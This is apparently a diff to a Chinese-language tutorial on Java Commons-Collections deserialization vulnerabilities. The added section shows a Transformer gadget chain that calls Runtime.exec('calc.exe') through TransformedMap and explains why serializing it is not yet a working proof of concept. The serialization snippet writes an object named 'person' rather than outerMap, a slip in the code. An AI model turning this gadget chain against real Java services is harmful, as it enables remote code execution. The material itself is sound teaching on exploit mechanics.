@@ -158,3 +158,34 @@ Method method = cls.getMethod("exec", new Class[]{String.class});
 method.invoke(object, new Object[]{"calc.exe"});
 ```
 
+#### 不是真正POC的原因
+
+先前例子中,我们手工执行outerMap.put("test", "xxxx")触发了反序列化漏洞,但是在正常的反序列化漏洞利用场景中,序列化对象只是一个类,即:
+
+```java
+Transformer[] transformers = new Transformer[]{
+        new ConstantTransformer(Runtime.getRuntime()),
+        new InvokerTransformer("exec", new Class[]{String.class},
+                new Object[]
+                        {"calc.exe"}),
+};
+
+Transformer transformerChain = new
+        ChainedTransformer(transformers);
+
+Map innerMap = new HashMap();
+Map outerMap = TransformedMap.decorate(innerMap, null,
+        transformerChain);
+
+// 序列化对象
+try (FileOutputStream fos = new FileOutputStream("person.ser");
+             ObjectOutputStream oos = new ObjectOutputStream(fos)) {
+    oos.writeObject(person);
+    System.out.println("Person 对象已经被序列化到 person.ser 文件");
+} catch (IOException e) {
+    e.printStackTrace();
+}
+```
+
+此时,我们虽然得到了outerMap的序列化对象,但是当其被反序列化时,如果readObject方法中没有outerMap.put这个方法,其也不可能触发反序列化漏洞
+
